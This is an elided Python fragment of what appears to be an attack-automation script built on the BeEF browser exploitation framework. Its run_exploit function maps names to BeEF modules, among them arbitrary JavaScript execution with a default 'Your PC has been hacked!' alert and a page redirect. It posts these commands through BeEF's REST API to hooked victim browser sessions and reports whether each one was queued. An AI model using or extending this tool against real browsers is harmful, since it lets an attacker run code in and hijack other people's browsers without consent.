...
def run_exploit(exploit_name, session_id, extra_param=None):
    ...
    exploits = {
        ...
        'js': {
            'module_id': 80,  
            'params': {'cmd': extra_param or 'alert("Your PC has been hacked!")'}
        },
        'redirect': {
            'module_id': 260,  
    ...
    try:
        console.print(f"[yellow]Executing {exploit_name}...[/yellow]")
        
        # BeEF REST API endpoint format
        # The UI uses: /api/modules/{hooked_browser_session}/{module_id}?token=xxx
        api_url = f'http://{BEEF_HOST}:{BEEF_PORT}/api/modules/{session_id}/{exploit["module_id"]}'
        
        # Prepare the payload - BeEF expects parameters as JSON
        payload = exploit['params']
        
        console.print(f"[dim]  URL: {api_url}[/dim]")
        console.print(f"[dim]  Payload: {payload}[/dim]")
        
        # Method 1: Try with token in params (most reliable for BeEF REST API)
        if token != 'use_basic_auth':
            response = requests.post(
                api_url,
                params={'token': token},
        ...
        if response.status_code == 200:
            try:
                ...
                console.print(f"[dim]  Response: {resp_data}[/dim]")
                
                # Check if command was queued successfully
                if 'success' in resp_data or 'command_id' in resp_data:
                    console.print(f"[green]✓ {exploit_name.upper()} executed successfully![/green]")
                    return True
                elif resp_data.get('success') == False:
                    console.print(f"[yellow]⚠ Command sent but BeEF returned: {resp_data}[/yellow]")
                    return False
            except:
                # Some responses might not be JSON
                console.print(f"[green]✓ {exploit_name.upper()} command sent (status 200)![/green]")
                return True
        
        # If we got here, the command failed
        console.print(f"[red]✗ Failed (Status: {response.status_code})[/red]")
        console.print(f"[yellow]Response: {response.text[:300]}[/yellow]")
